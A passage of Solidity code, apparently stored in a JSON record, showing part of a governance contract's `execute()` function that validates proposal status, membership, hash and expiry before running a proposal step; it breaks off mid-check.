`ProposalExecutionEngine` enforces that only one `InProgress` proposal\n    ///      is active at a time, so that proposal must be completed or cancelled via `cancel()`\n    ///      in order to execute a different proposal.\n    ///      `extraData` is optional, off-chain data a proposal might need to execute a step.\n    /// @param proposalId The ID of the proposal to execute.\n    /// @param proposal The details of the proposal.\n    /// @param preciousTokens The tokens that the party considers precious.\n    /// @param preciousTokenIds The token IDs associated with each precious token.\n    /// @param progressData The data returned from the last `execute()` call, if any.\n    /// @param extraData Off-chain data a proposal might need to execute a step.\n    function execute(\n        uint256 proposalId,\n        Proposal memory proposal,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds,\n        bytes calldata progressData,\n        bytes calldata extraData\n    ) external payable {\n        _assertNotGloballyDisabled();\n        _assertActiveMember();\n        // Get information about the proposal.\n        ProposalState storage proposalState = _proposalStateByProposalId[proposalId];\n        // Proposal details must remain the same from `propose()`.\n        _validateProposalHash(proposal, proposalState.hash);\n        ProposalStateValues memory values = proposalState.values;\n        ProposalStatus status = _getProposalStatus(values);\n        // The proposal must be executable or have already been executed but still\n        // has more steps to go.\n        if (status != ProposalStatus.Ready && status != ProposalStatus.InProgress) {\n            revert BadProposalStatusError(status);\n        }\n        if (status == ProposalStatus.Ready) {\n            // If the proposal has not been executed yet, make sure it hasn't\n            // expired. Note that proposals that have been executed\n            // (but still have more steps) ignore `maxExecutableTime`.\n            if (proposal.maxExecutableTime < block.timestamp) {\n                revert ExecutionTimeExceededError(\n                    proposal.maxExecutableTime,\n                    uint40(block.timestamp)\n                );\n            }\n            proposalState.values.executedTime = uint40(block.timestamp);\n        }\n        // Check that the precious list is valid.\n        if (!_isPreciousListCorrec"
    }
  ]
}